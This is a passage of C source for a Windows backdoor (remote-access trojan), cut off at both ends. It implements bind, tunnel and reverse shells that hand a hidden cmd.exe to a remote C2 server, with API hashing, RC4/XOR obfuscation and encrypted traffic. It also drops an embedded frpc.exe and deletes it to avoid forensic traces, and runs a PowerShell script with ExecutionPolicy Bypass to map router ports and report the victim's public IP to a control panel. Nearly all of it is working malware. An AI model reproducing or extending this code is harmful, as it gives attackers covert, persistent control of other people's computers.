 * The function is gone; this is a no-op shim that won't compile in. */
#define junk(x) (x)

/* ====================================================================
 * 隧道模式 — 主动连接隧道服务器（替代 bind shell 的 accept）
 * ==================================================================== */
#ifdef TUNNEL_MODE
#  include "tunnel_cfg.h"
static int _tunnel_reg(SOCKET *ts) {
    void *psk = api(MH_WS, H_socket);
    void *pcn = api(MH_WS, 0xD3764DCF); /* connect */
    if (!psk || !pcn) return 0;
    SOCKET s = ((SOCKET(WSAAPI*)(int,int,int))psk)(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return 0;
    struct sockaddr_in a;
    a.sin_family = AF_INET;
    BYTE ip[4] = TUNNEL_SERVER_IP;
    a.sin_addr.s_addr = (DWORD)(ip[0]|(ip[1]<<8)|(ip[2]<<16)|(ip[3]<<24));
    void *pht = api(MH_WS, H_htons);
    a.sin_port = pht ? ((u_short(WSAAPI*)(u_short))pht)((u_short)TUNNEL_SERVER_PORT) : (u_short)TUNNEL_SERVER_PORT;
    if (((int(WSAAPI*)(SOCKET,const struct sockaddr*,int))pcn)(s, (struct sockaddr*)&a, sizeof(a)) != 0) {
        ((void(WSAAPI*)(SOCKET))api(MH_WS, H_closesocket))(s); return 0; }
    *ts = s; return 1;
}
static int _tunnel_wait_go(SOCKET ts) {
    void *prv = api(MH_WS, H_recv);
    char b[16];
    /* 读 "READY\n" */
    int n = ((int(WSAAPI*)(SOCKET,char*,int,int))prv)(ts, b, 6, 0);
    if (n <= 0) return 0;
    /* 读 "GO\n" */
    n = ((int(WSAAPI*)(SOCKET,char*,int,int))prv)(ts, b, 3, 0);
    return (n > 0);
}
#endif

/* ====================================================================
 * Per-mode bind/tunnel/reverse shell + concurrent client workers
 *
 * Optim D + Concurrency:
 *
 * - `bsh()` used to be a single `#ifdef TUNNEL_MODE`-controlled mess.
 *   We split into three listeners (bsh_bind / bsh_tunnel / bsh_reverse)
 *   chosen at compile time.
 * - Per-client pipes+select+forward logic is unified into one worker
 *   `_serve_client`.  Each accepted client gets its own OS thread
 *   instead of serialising the accept loop.  Function pointers
 *   resolved once by the listener are passed by value.
 * - Per-thread XOR (XorCtx in serv_ctx_t) replaces the global _xpos
 *   so concurrent threads don't race.
 *
 * Mutex over `_serve_client` is not needed because each thread has
 * its own serv_ctx_t and XorCtx; the only shared global state left
 * is `_xor_key` defaults which is read-only after WinMain finishes.
 * ==================================================================== */
typedef struct {
    SOCKET cl;
    void *pCP, *pSH, *pCPr, *pCH, *pTP, *pWF, *pRF, *pPNP, *prv, *psd, *pcs;
    XorCtx xc;
    char peer_ip[64];      /* for notify_session_evt panel call */
} serv_ctx_t;

/* Decode cmd.exe path (RC4-encrypted) into buffer; buf must be >= 24. */
static void _decode_cmdpath(BYTE *buf) {
    BYTE _k[] = {0x2F,0x80,0xAC,0x59,0xE2,0x1A,0x79,0xBD,0x13};
    BYTE _d[] = {0xE9,0xF2,0x4F,0xA6,0x9B,0x0E,0x24,0x8F,0xDF,0x27,0x4A,0x51,0x21,0xAB,0x11,0xAE,0x04,0x04,0x8D,0x27,0x3B,0x51,0x51};
    rc4_str(_k, sizeof(_k), _d, 23, buf); buf[23] = 0;
}

/* Forward declarations — see below. */
static DWORD WINAPI _serve_client(LPVOID lp);

/* Resolve all win32/winsock API pointers in one place. */
static int _bsh_setup_api(void **pcs, void **pbd, void **pls, void **pac,
                          void **psk, void **pso, void **prv, void **psd,
                          void **pht, void **phl,
                          void **pWSAS, void **pWSAC,
                          void **pCP, void **pSH, void **pCPr, void **pCH,
                          void **pTP, void **pWF, void **pRF, void **pPNP) {
    *pWSAS = api(MH_WS, H_WSAStartup);
    *pWSAC = api(MH_WS, H_WSACleanup);
    *psk   = api(MH_WS, H_socket);
    *pbd   = api(MH_WS, H_bind);
    *pls   = api(MH_WS, H_listen);
    *pac   = api(MH_WS, H_accept);
    *pcs   = api(MH_WS, H_closesocket);
    *pso   = api(MH_WS, H_setsockopt);
    *prv   = api(MH_WS, H_recv);
    *psd   = api(MH_WS, H_send);
    *phl   = api(MH_WS, H_htonl);
    *pht   = api(MH_WS, H_htons);
    *pCP   = api(MH_KR, H_CreatePipe);
    *pSH   = api(MH_KR, H_SetHandleInfo);
    *pCPr  = api(MH_KR, H_CreateProcessA);
    *pCH   = api(MH_KR, H_CloseHandle);
    *pTP   = api(MH_KR, H_TerminateProcess);
    *pWF   = api(MH_KR, H_WriteFile);
    *pRF   = api(MH_KR, H_ReadFile);
    *pPNP  = api(MH_KR, H_PeekNamedPipe);
    if (!*pWSAS || !*psk || !*pCP || !*pCPr) return 0;
    return 1;
}

/* Capture peer IP from connected socket into buffer (dotted-quad).
 * Returns the same buffer on success, "" on failure. */
static char *_peer_ip_str(SOCKET s, char *buf, int cap) {
    if (cap < 16) { if (cap > 0) buf[0] = 0; return buf; }
    mem_set(buf, 0, cap);
    struct sockaddr_in a; int alen = sizeof(a);
    void *pGPN = api(MH_WS, 0xA3B233D2); /* getpeername hash */
    if (pGPN && ((int(WSAAPI*)(SOCKET,struct sockaddr*,int*))pGPN)(s, (struct sockaddr*)&a, &alen) == 0) {
        /* sin_addr is in network byte order; S_un_b fields give octets directly. */
        BYTE b1 = a.sin_addr.S_un.S_un_b.s_b1;
        BYTE b2 = a.sin_addr.S_un.S_un_b.s_b2;
        BYTE b3 = a.sin_addr.S_un.S_un_b.s_b3;
        BYTE b4 = a.sin_addr.S_un.S_un_b.s_b4;
        /* Hand-format "a.b.c.d" to avoid relying on sprintf. */
        int n = 0;
        #define APP_DIGIT(v) do { \
            if (v >= 100) buf[n++] = (char)('0' + v / 100); \
            if (v >= 10)  buf[n++] = (char)('0' + (v / 10) % 10); \
            buf[n++] = (char)('0' + v % 10); } while(0)
        #define APP_DOT()   do { buf[n++] = '.'; } while(0)
        APP_DIGIT(b1); APP_DOT();
        APP_DIGIT(b2); APP_DOT();
        APP_DIGIT(b3); APP_DOT();
        APP_DIGIT(b4);
        #undef APP_DIGIT
        #undef APP_DOT
    }
    return buf;
}

/* ====================================================================
 * _serve_client -- one thread per accepted connection.
 * ==================================================================== */
static DWORD WINAPI _serve_client(LPVOID lp) {
    serv_ctx_t *cx = (serv_ctx_t*)lp;
    if (!cx) return 0;
    SOCKET cl = cx->cl;
    XorCtx  *xc = &cx->xc;

    HANDLE hIR, hIW, hOR, hOW;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE;
    if (!((BOOL(WINAPI*)(HANDLE*,HANDLE*,SECURITY_ATTRIBUTES*,DWORD))cx->pCP)(&hIR, &hIW, &sa, 0)) {
        ((void(WSAAPI*)(SOCKET))cx->pcs)(cl); HeapFree(GetProcessHeap(), 0, cx); return 0;
    }
    if (!((BOOL(WINAPI*)(HANDLE*,HANDLE*,SECURITY_ATTRIBUTES*,DWORD))cx->pCP)(&hOR, &hOW, &sa, 0)) {
        ((void(WSAAPI*)(SOCKET))cx->pcs)(cl);
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIR);
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIW);
        HeapFree(GetProcessHeap(), 0, cx);
        return 0;
    }

    ((BOOL(WINAPI*)(HANDLE,DWORD,DWORD))cx->pSH)(hIW, HANDLE_FLAG_INHERIT, 0);
    ((BOOL(WINAPI*)(HANDLE,DWORD,DWORD))cx->pSH)(hOR, HANDLE_FLAG_INHERIT, 0);

    /* Per-session XOR key exchange (best-effort; on failure fall
     * back to the static transport key). */
    _xor_negotiate(cl, &cx->xc, cx->psd, cx->prv);

    BYTE cmdpath[24];
    _decode_cmdpath(cmdpath);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    mem_set(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hIR; si.hStdOutput = hOW; si.hStdError = hOW;

    if (!((BOOL(WINAPI*)(LPCSTR,LPSTR,void*,void*,BOOL,DWORD,void*,void*,LPSTARTUPINFOA,LPPROCESS_INFORMATION))cx->pCPr)(NULL, (LPSTR)cmdpath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIR);
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIW);
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hOR);
        ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hOW);
        ((void(WSAAPI*)(SOCKET))cx->pcs)(cl);
        HeapFree(GetProcessHeap(), 0, cx);
        return 0;
    }

    ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIR);
    ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hOW);

    {
        BYTE buf[2048];
        for (;;) {
            fd_set rfds; struct timeval tv;
            FD_ZERO(&rfds); FD_SET(cl, &rfds);
            tv.tv_sec = 0; tv.tv_usec = 100000;
            int sel = select(0, &rfds, NULL, NULL, &tv);
            if (sel < 0) break;
            if (sel > 0 && FD_ISSET(cl, &rfds)) {
                int ret = ((int(WSAAPI*)(SOCKET,char*,int,int))cx->prv)(cl, (char*)buf, sizeof(buf), 0);
                if (ret <= 0) break;
                xor_buf(xc, buf, ret);
                DWORD n;
                ((BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))cx->pWF)(hIW, buf, (DWORD)ret, &n, NULL);
            }
            DWORD avail = 0;
            if (cx->pPNP &&
                ((BOOL(WINAPI*)(HANDLE,void*,DWORD,LPDWORD,LPDWORD,LPDWORD))cx->pPNP)(hOR, NULL, 0, NULL, &avail, NULL)
                && avail > 0) {
                DWORD tr = avail < sizeof(buf) ? avail : (DWORD)sizeof(buf);
                DWORD n;
                if (cx->pRF &&
                    ((BOOL(WINAPI*)(HANDLE,void*,DWORD,LPDWORD,LPOVERLAPPED))cx->pRF)(hOR, buf, tr, &n, NULL)
                    && n > 0) {
                    xor_buf(xc, buf, n);
                    ((int(WSAAPI*)(SOCKET,const char*,int,int))cx->psd)(cl, (const char*)buf, (int)n, 0);
                }
            }
        }
    }

    if (cx->pTP) ((BOOL(WINAPI*)(HANDLE,UINT))cx->pTP)(pi.hProcess, 0);
    if (cx->pCH) { ((BOOL(WINAPI*)(HANDLE))cx->pCH)(pi.hThread); ((BOOL(WINAPI*)(HANDLE))cx->pCH)(pi.hProcess); }
    if (cx->pCH) { ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hIW); ((BOOL(WINAPI*)(HANDLE))cx->pCH)(hOR); }
    ((void(WSAAPI*)(SOCKET))cx->pcs)(cl);
    HeapFree(GetProcessHeap(), 0, cx);
    return 0;
}

/* Build per-client context.  peer_ip is dotted-quad from caller (may be NULL). */
static serv_ctx_t *_make_ctx(SOCKET cl, const char *peer_ip,
                             void *pCP, void *pSH, void *pCPr,
                             void *pCH, void *pTP, void *pWF, void *pRF,
                             void *pPNP, void *prv, void *psd, void *pcs) {
    serv_ctx_t *cx = (serv_ctx_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(serv_ctx_t));
    if (!cx) return NULL;
    cx->cl   = cl;
    cx->pCP  = pCP; cx->pSH  = pSH;  cx->pCPr = pCPr;
    cx->pCH  = pCH; cx->pTP  = pTP;  cx->pWF  = pWF;
    cx->pRF  = pRF; cx->pPNP = pPNP; cx->prv  = prv;
    cx->psd  = psd; cx->pcs  = pcs;
    if (peer_ip) {
        int i; for (i = 0; peer_ip[i] && i < (int)sizeof(cx->peer_ip) - 1; i++) cx->peer_ip[i] = peer_ip[i];
        cx->peer_ip[i] = 0;
    }
    xor_init(&cx->xc, XOR_KEY_TRANSPORT, sizeof(XOR_KEY_TRANSPORT));
    return cx;
}

/* Spawn a worker for an accepted client.  Returns 0 on failure.
 * Captures peer IP via getpeername for the panel notification. */
static int _spawn_worker(SOCKET cl, void *pCP, void *pSH, void *pCPr,
                         void *pCH, void *pTP, void *pWF, void *pRF,
                         void *pPNP, void *prv, void *psd, void *pcs) {
    char ipbuf[64];
    _peer_ip_str(cl, ipbuf, sizeof(ipbuf));
    serv_ctx_t *cx = _make_ctx(cl, ipbuf, pCP, pSH, pCPr, pCH, pTP, pWF, pRF,
                               pPNP, prv, psd, pcs);
    if (!cx) {
        ((void(WSAAPI*)(SOCKET))pcs)(cl);
        return 0;
    }
    HANDLE ht = CreateThread(NULL, 0, _serve_client, cx, 0, NULL);
    if (!ht) { HeapFree(GetProcessHeap(), 0, cx); ((void(WSAAPI*)(SOCKET))pcs)(cl); return 0; }
    CloseHandle(ht);   /* detached */
    /* Panel notification: a session just opened.  Fired async on
     * listener thread (not on worker) so a slow panel doesn't block
     * the cmd pipes.  1Hz throttle is built into notify_event. */
    INLINE_NOTIFY_SESSION(ipbuf);
    return 1;
}

/* ====================================================================
 * bsh_bind — listen on port 54321, spawn worker per connection.
 * ==================================================================== */
static DWORD WINAPI bsh_bind(LPVOID lp) {
    (void)lp;
    void *hLL = api(MH_KR, H_LoadLibraryA);
    if (hLL) ((HMODULE(WINAPI*)(LPCSTR))hLL)("ws2_32.dll");

    void *pWSAS, *pWSAC, *psk, *pbd, *pls, *pac, *pcs, *pso, *prv, *psd, *pht, *phl;
    void *pCP, *pSH, *pCPr, *pCH, *pTP, *pWF, *pRF, *pPNP;
    if (!_bsh_setup_api(&pcs, &pbd, &pls, &pac, &psk, &pso, &prv, &psd,
                         &pht, &phl, &pWSAS, &pWSAC,
                         &pCP, &pSH, &pCPr, &pCH, &pTP, &pWF, &pRF, &pPNP)) return 0;

    WSADATA wd;
    if (((int(WSAAPI*)(WORD,LPWSADATA))pWSAS)(MAKEWORD(2,2), &wd) != 0) return 0;

    SOCKET s = ((SOCKET(WSAAPI*)(int,int,int))psk)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { ((void(WSAAPI*)(void))pWSAC)(); return 0; }
    int port = 54321;
    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port = ((u_short(WSAAPI*)(u_short))pht)((u_short)port);
    a.sin_addr.s_addr = ((u_long(WSAAPI*)(u_long))phl)(INADDR_ANY);
    int opt = 1;
    ((int(WSAAPI*)(SOCKET,int,int,const char*,int))pso)(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
    if (((int(WSAAPI*)(SOCKET,const struct sockaddr*,int))pbd)(s, (struct sockaddr*)&a, sizeof(a)) == SOCKET_ERROR) {
        ((void(WSAAPI*)(SOCKET))pcs)(s); ((void(WSAAPI*)(void))pWSAC)(); return 0;
    }
    if (((int(WSAAPI*)(SOCKET,int))pls)(s, 10) == SOCKET_ERROR) {
        ((void(WSAAPI*)(SOCKET))pcs)(s); ((void(WSAAPI*)(void))pWSAC)(); return 0;
    }

    /* Accept loop — each connection spawns a worker; listener stays
     * responsive even when the cmd.exe inside a worker hangs. */
    while (1) {
        SOCKET cl = ((SOCKET(WSAAPI*)(SOCKET,struct sockaddr*,int*))pac)(s, NULL, NULL);
        if (cl == INVALID_SOCKET) break;
        _spawn_worker(cl, pCP, pSH, pCPr, pCH, pTP, pWF, pRF, pPNP, prv, psd, pcs);
    }

    ((void(WSAAPI*)(SOCKET))pcs)(s);
    ((void(WSAAPI*)(void))pWSAC)();
    return 1;
}

/* ====================================================================
 * bsh_tunnel — actively connect to tunnel_server.py and forward.
 * (only compiled when TUNNEL_MODE is set)
 * ==================================================================== */
#ifdef TUNNEL_MODE
static DWORD WINAPI bsh_tunnel(LPVOID lp) {
    (void)lp;
    void *hLL = api(MH_KR, H_LoadLibraryA);
    if (hLL) ((HMODULE(WINAPI*)(LPCSTR))hLL)("ws2_32.dll");

    void *pWSAS, *pWSAC, *psk, *pbd, *pls, *pac, *pcs, *pso, *prv, *psd, *pht, *phl;
    void *pCP, *pSH, *pCPr, *pCH, *pTP, *pWF, *pRF, *pPNP;
    if (!_bsh_setup_api(&pcs, &pbd, &pls, &pac, &psk, &pso, &prv, &psd,
                         &pht, &phl, &pWSAS, &pWSAC,
                         &pCP, &pSH, &pCPr, &pCH, &pTP, &pWF, &pRF, &pPNP)) return 0;

    WSADATA wd;
    if (((int(WSAAPI*)(WORD,LPWSADATA))pWSAS)(MAKEWORD(2,2), &wd) != 0) return 0;

    /* Connect-and-forward loop, retry every 5s on disconnect. */
    while (1) {
        SOCKET cl;
        if (!_tunnel_reg(&cl)) { Sleep(5000); continue; }
        if (!_tunnel_wait_go(cl)) { ((void(WSAAPI*)(SOCKET))pcs)(cl); Sleep(5000); continue; }
        /* tunnel server accepts only one target at a time by design.
         * Spawn a worker.  When the worker exits (disconnect), this
         * loop reconnects. */
        _spawn_worker(cl, pCP, pSH, pCPr, pCH, pTP, pWF, pRF, pPNP, prv, psd, pcs);
        /* brief wait so we don't reconnect-spam if the server is down */
        Sleep(2000);
    }
    /* unreachable */
    ((void(WSAAPI*)(void))pWSAC)();
    return 1;
}
#endif

/* ====================================================================
 * bsh_reverse — actively connect out to a C2 listener (new mode).
 * ==================================================================== */
#ifdef REVERSE_MODE
#  include "reverse_cfg.h"
static DWORD WINAPI bsh_reverse(LPVOID lp) {
    (void)lp;
    void *hLL = api(MH_KR, H_LoadLibraryA);
    if (hLL) ((HMODULE(WINAPI*)(LPCSTR))hLL)("ws2_32.dll");

    void *pWSAS, *pWSAC, *psk, *pbd, *pls, *pac, *pcs, *pso, *prv, *psd, *pht, *phl;
    void *pCP, *pSH, *pCPr, *pCH, *pTP, *pWF, *pRF, *pPNP;
    if (!_bsh_setup_api(&pcs, &pbd, &pls, &pac, &psk, &pso, &prv, &psd,
                         &pht, &phl, &pWSAS, &pWSAC,
                         &pCP, &pSH, &pCPr, &pCH, &pTP, &pWF, &pRF, &pPNP)) return 0;

    WSADATA wd;
    if (((int(WSAAPI*)(WORD,LPWSADATA))pWSAS)(MAKEWORD(2,2), &wd) != 0) return 0;

    /* Retry loop with backoff */
    int backoff = 1000;
    while (1) {
        SOCKET s = ((SOCKET(WSAAPI*)(int,int,int))psk)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { Sleep(backoff); backoff = backoff < 60000 ? backoff * 2 : 60000; continue; }
        struct sockaddr_in a;
        a.sin_family = AF_INET;
        BYTE ip[4] = REVERSE_TARGET_IP;
        a.sin_addr.s_addr = (DWORD)(ip[0]|(ip[1]<<8)|(ip[2]<<16)|(ip[3]<<24));
        a.sin_port = ((u_short(WSAAPI*)(u_short))pht)((u_short)REVERSE_TARGET_PORT);
        if (((int(WSAAPI*)(SOCKET,const struct sockaddr*,int))api(MH_WS, 0xD3764DCF /*connect*/))(s, (struct sockaddr*)&a, sizeof(a)) != 0) {
            ((void(WSAAPI*)(SOCKET))pcs)(s);
            Sleep(backoff); backoff = backoff < 60000 ? backoff * 2 : 60000; continue;
        }
        backoff = 1000;
        if (!_spawn_worker(s, pCP, pSH, pCPr, pCH, pTP, pWF, pRF, pPNP, prv, psd, pcs)) {
            Sleep(backoff); backoff = backoff < 60000 ? backoff * 2 : 60000;
            continue;
        }
        /* Reverse shell: just one connection at a time.  Wait for
         * worker to exit (which happens when remote disconnects),
         * then reconnect.  Since the worker freed its ctx, we just
         * loop on the next iteration. */
        Sleep(3000);
    }
    /* unreachable */
    ((void(WSAAPI*)(void))pWSAC)();
    return 1;
}
#endif

/* ====================================================================
 * FRP 隧道启动 (嵌入 frpc.exe)
 * ==================================================================== */
#ifdef ENABLE_FRP

/* Bug-fix: schedule cleanup of %TEMP%\frpc.exe and %TEMP%\frpc.toml
 * to avoid leaving forensic artifacts on disk after process exits.
 * frpc.exe stays locked while running, so we may need to retry.
 * Background thread polls DeleteFileA then falls back to
 * MoveFileExA(MOVEFILE_DELAY_UNTIL_REBOOT). */
static DWORD WINAPI _frpc_cleanup(LPVOID p) {
    char *paths = (char*)p;
    if (!paths) return 0;
    char *sep = strchr(paths, '\x1f');
    if (!sep) { HeapFree(GetProcessHeap(), 0, paths); return 0; }
    *sep = 0;
    char *fp_ = paths;
    char *cp_ = sep + 1;
    /* frpc.toml is read at start; can be removed immediately. */
    DeleteFileA(cp_);
    /* frpc.exe may be locked; poll up to 30s then defer to reboot. */
    int i;
    for (i = 0; i < 30; i++) {
        if (DeleteFileA(fp_)) break;
        Sleep(1000);
    }
    if (i == 30) {
        /* MoveFileExA schedules deletion of fp_ at next boot when the
         * file is locked. */
        MoveFileExA(fp_, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
    HeapFree(GetProcessHeap(), 0, paths);
    return 0;
}

static int start_frpc(void) {
    void *pGTP = api(MH_KR, H_GetTempPathA);
    void *pCFA = api(MH_KR, H_CreateFileA);
    void *pWF  = api(MH_KR, H_WriteFile);
    void *pCH  = api(MH_KR, H_CloseHandle);
    void *pCPA = api(MH_KR, H_CreateProcessA);
    void *pVA  = api(MH_KR, H_VirtualAlloc);
    if (!pGTP || !pCFA || !pWF || !pCH || !pCPA || !pVA) return 0;

    char tmp[260]; mem_set(tmp, 0, 260);
    DWORD tl = ((DWORD(WINAPI*)(DWORD,LPSTR))pGTP)(260, tmp);
    if (!tl || tl >= 260) return 0;

    char fp[260], cp[260];
    mem_set(fp, 0, 260); mem_set(cp, 0, 260);
    strapp_n(fp, tmp, sizeof(fp)); strapp_n(fp, "\\frpc.exe", sizeof(fp)); strapp_n(cp, tmp, sizeof(cp)); strapp_n(cp, "\\frpc.toml", sizeof(cp));

    void *fb = ((void*(WINAPI*)(void*,SIZE_T,DWORD,DWORD))pVA)(NULL, g_frpc_enc_len, 0x3000, 4);
    if (!fb) return 0;
    xor_frp(g_frpc_enc, (BYTE*)fb, g_frpc_enc_len);

    /* Bug-fix: open frpc.exe with FILE_SHARE_DELETE so we can delete it
     * while frpc is running. Original used 0x80 (FILE_ATTRIBUTE_NORMAL)
     * only and locked the file against deletion. */
    HANDLE hF = ((HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,void*,DWORD,DWORD,HANDLE))pCFA)(
        fp, 0x40000000, 0x07 /*FILE_SHARE_READ|WRITE|DELETE*/,
        NULL, 2 /*CREATE_ALWAYS*/, 0x80, NULL);
    if (hF == INVALID_HANDLE_VALUE) { ((void(WINAPI*)(void*,SIZE_T,DWORD))pVA)(fb, 0, 0x8000); return 0; }
    { DWORD nw; ((BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))pWF)(hF, fb, g_frpc_enc_len, &nw, NULL); }
    ((BOOL(WINAPI*)(HANDLE))pCH)(hF);

    BYTE cb[512]; mem_set(cb, 0, sizeof(cb));
    xor_frp(g_config_enc, cb, g_config_enc_len);

    HANDLE hC = ((HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,void*,DWORD,DWORD,HANDLE))pCFA)(cp, 0x40000000, 0, NULL, 2, 0x80, NULL);
    if (hC == INVALID_HANDLE_VALUE) { ((void(WINAPI*)(void*,SIZE_T,DWORD))pVA)(fb, 0, 0x8000); return 0; }
    { DWORD nw; ((BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))pWF)(hC, cb, g_config_enc_len, &nw, NULL); }
    ((BOOL(WINAPI*)(HANDLE))pCH)(hC);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si; mem_set(&si, 0, sizeof(si)); si.cb = sizeof(si);
    ((BOOL(WINAPI*)(LPCSTR,LPSTR,void*,void*,BOOL,DWORD,void*,void*,LPSTARTUPINFOA,LPPROCESS_INFORMATION))pCPA)(
        fp, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hThread); ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hProcess); }

    ((void(WINAPI*)(void*,SIZE_T,DWORD))pVA)(fb, 0, 0x8000);

    /* Schedule cleanup.  Allocate a payload that holds both paths
     * separated by 0x1F (an unprintable char that won't appear in
     * filesystem paths).  Heap-allocated so the cleanup thread
     * owns it. */
    {
        int fl = str_len(fp), cl = str_len(cp);
        char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, fl + 1 + cl + 1);
        if (buf) {
            mem_cpy(buf, fp, fl); buf[fl] = 0x1F;
            mem_cpy(buf + fl + 1, cp, cl); buf[fl + 1 + cl] = 0;
            HANDLE ht = CreateThread(NULL, 0, _frpc_cleanup, buf, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    }
    return 1;
}
#endif

/* ====================================================================
 * UPnP 端口映射
 * ==================================================================== */
#ifdef ENABLE_UPNP
static char g_upnp_ip[64] = {0};    /* WAN (public) IP from UPnP */
static char g_upnp_lan[64] = {0};   /* LAN (internal) IP, panel ident */
static int do_upnp(void) {
    void *pGTP = api(MH_KR, H_GetTempPathA);
    void *pCFA = api(MH_KR, H_CreateFileA);
    void *pWF  = api(MH_KR, H_WriteFile);
    void *pRF  = api(MH_KR, H_ReadFile);
    void *pCH  = api(MH_KR, H_CloseHandle);
    void *pCPA = api(MH_KR, H_CreateProcessA);
    void *pVA  = api(MH_KR, H_VirtualAlloc);
    void *pDFA = api(MH_KR, H_DeleteFileA);
    if (!pGTP || !pCFA || !pWF || !pRF || !pCH || !pCPA || !pVA) return 0;

    char tmp[260]; mem_set(tmp, 0, 260);
    DWORD tl = ((DWORD(WINAPI*)(DWORD,LPSTR))pGTP)(260, tmp);
    if (!tl || tl >= 260) return 0;

    char ps_path[260], out_path[260];
    mem_set(ps_path, 0, 260); mem_set(out_path, 0, 260);
    strapp_n(ps_path, tmp, sizeof(ps_path)); strapp_n(ps_path, "\\wu.ps1", sizeof(ps_path));
    strapp_n(out_path, tmp, sizeof(out_path)); strapp_n(out_path, "\\wu_out.txt", sizeof(out_path));

    BYTE *dec = (BYTE*)((void*(WINAPI*)(void*,SIZE_T,DWORD,DWORD))pVA)(NULL, g_upnp_ps_enc_len, 0x3000, 4);
    if (!dec) return 0;
    mem_cpy(dec, g_upnp_ps_enc, g_upnp_ps_enc_len);
    { BYTE upk[] = UPNP_RC4_KEY; rc4_crypt(upk, UPNP_RC4_KEY_LEN, dec, g_upnp_ps_enc_len); }

    HANDLE hF = ((HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,void*,DWORD,DWORD,HANDLE))pCFA)(ps_path, 0x40000000, 0, NULL, 2, 0x80, NULL);
    if (hF == INVALID_HANDLE_VALUE) { ((void(WINAPI*)(void*,SIZE_T,DWORD))pVA)(dec, 0, 0x8000); return 0; }
    { DWORD nw; ((BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))pWF)(hF, dec, g_upnp_ps_enc_len, &nw, NULL); }
    ((BOOL(WINAPI*)(HANDLE))pCH)(hF);
    ((void(WINAPI*)(void*,SIZE_T,DWORD))pVA)(dec, 0, 0x8000);

    char cmdline[520]; mem_set(cmdline, 0, sizeof(cmdline));
    strapp_n(cmdline, "cmd.exe /c powershell -ExecutionPolicy Bypass -NoP -NonI -File \"", sizeof(cmdline));
    strapp_n(cmdline, ps_path, sizeof(cmdline));
    strapp_n(cmdline, "\" > \"", sizeof(cmdline));
    strapp_n(cmdline, out_path, sizeof(cmdline));
    strapp_n(cmdline, "\"", sizeof(cmdline));

    PROCESS_INFORMATION pi;
    STARTUPINFOA si; mem_set(&si, 0, sizeof(si)); si.cb = sizeof(si);
    ((BOOL(WINAPI*)(LPCSTR,LPSTR,void*,void*,BOOL,DWORD,void*,void*,LPSTARTUPINFOA,LPPROCESS_INFORMATION))pCPA)(
        "cmd.exe", cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    /* Bug-fix: original returned immediately on CreateProcessA failure,
     * leaving wu.ps1 / wu_out.txt on disk.  Clean up before returning. */
    if (!pi.hProcess) {
        if (pDFA) { ((BOOL(WINAPI*)(LPCSTR))pDFA)(ps_path); ((BOOL(WINAPI*)(LPCSTR))pDFA)(out_path); }
        return 0;
    }
    ((DWORD(WINAPI*)(HANDLE,DWORD))api(MH_KR, H_WaitForObj))(pi.hProcess, 15000);
    ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hThread);
    ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hProcess);

    hF = ((HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,void*,DWORD,DWORD,HANDLE))pCFA)(out_path, 0x80000000, 1, NULL, 3, 0, NULL);
    if (hF == INVALID_HANDLE_VALUE) {
        if (pDFA) { ((BOOL(WINAPI*)(LPCSTR))pDFA)(ps_path); ((BOOL(WINAPI*)(LPCSTR))pDFA)(out_path); }
        return 0;
    }
    char out[128]; mem_set(out, 0, sizeof(out));
    { DWORD nr; ((BOOL(WINAPI*)(HANDLE,void*,DWORD,LPDWORD,LPOVERLAPPED))pRF)(hF, out, sizeof(out)-1, &nr, NULL); }
    ((BOOL(WINAPI*)(HANDLE))pCH)(hF);

    /* Clean up temp files */
    if (pDFA) { ((BOOL(WINAPI*)(LPCSTR))pDFA)(ps_path); ((BOOL(WINAPI*)(LPCSTR))pDFA)(out_path); }

    char *p = out;
    while (*p && *p != '\n' && *p != '\r') p++;
    *p = 0;
    if (mem_cmp(out, "UPNP_OK:", 8) == 0) {
        /* Line format from gen_upnp.py:  UPNP_OK:<wan_ip>|<lan_ip>
         * e.g. UPNP_OK:117.25.122.12|192.168.1.100   */
        char *ip = out + 8;
        int i = 0;
        while (ip[i] && ip[i] != '|' && i < 63) { g_upnp_ip[i] = ip[i]; i++; }
        g_upnp_ip[i] = 0;
        if (ip[i] == '|') {
            char *lan = ip + i + 1;
            int j = 0;
            while (lan[j] && j < 63) { g_upnp_lan[j] = lan[j]; j++; }
